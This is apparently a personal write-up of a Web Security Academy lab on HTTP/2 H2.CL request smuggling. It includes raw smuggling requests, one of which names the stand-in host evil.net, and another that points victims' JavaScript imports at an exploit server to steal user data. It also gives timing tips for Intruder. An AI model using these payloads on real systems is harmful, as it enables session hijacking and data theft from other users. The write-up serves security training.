# H2.CL request smuggling

![image.png](H2%20CL%20request%20smuggling/image.png)

![image.png](H2%20CL%20request%20smuggling/image%201.png)

To detect [H2.CL](http://H2.CL), we can use the following payload:

```xml
POST / HTTP/2
Host: 0ad7005003e00ce0800a3531005b000b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /lalala HTTP/1.1
Host: 0ad7005003e00ce0800a3531005b000b.web-security-academy.net
Content-Length: 5

x=1
```

Sent a request a few times - got 404, i.e. my own request got poisoned

![image.png](H2%20CL%20request%20smuggling/image%202.png)

We can also see a script that triggers analytics fetching

![image.png](H2%20CL%20request%20smuggling/image%203.png)

![image.png](H2%20CL%20request%20smuggling/image%204.png)

![image.png](H2%20CL%20request%20smuggling/image%205.png)

Let’s get the analyticsFetcher request to the Repeater and try to access the script resource folder:

![image.png](H2%20CL%20request%20smuggling/image%206.png)

We found an On-Site redirect (the request path gets directly used in a Location header) that we could use to route the victim’s request to the malicious server

First, simplify the request to the script resource folder

![image.png](H2%20CL%20request%20smuggling/image%207.png)

Then, construct a smuggling request that will route to the malicious location. Note that the content-length of a smuggled request is 3 so that at least one byte of a legit request is appended to the smuggle. DON’T FORGET TO DOWNGRADE TO HTTP FOR A SMUGGLED REQUEST!

```xml
POST / HTTP/2
Host: 0ad7005003e00ce0800a3531005b000b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: evil.net
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
```

![image.png](H2%20CL%20request%20smuggling/image%208.png)

![image.png](H2%20CL%20request%20smuggling/image%209.png)

Let’s host some bad stuff on the exploit server and try to use it to steal user data.

![image.png](H2%20CL%20request%20smuggling/image%2010.png)

```xml
POST / HTTP/2
Host: 0af8004b0402dda68036084a00770093.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-0af7005d04fbdddb8082073a0119004e.exploit-server.net/exploit
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
```

Any further request results in a following:

![image.png](H2%20CL%20request%20smuggling/image%2011.png)

Now, we’ll just repeat the attack using Intruder (don’t forget to untick automatic Content-Length for the Intruder). This is because you need to time your attack so that it poisons the connection immediately before the victim’s browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won’t execute it.

![image.png](H2%20CL%20request%20smuggling/image%2012.png)

![image.png](H2%20CL%20request%20smuggling/image%2013.png)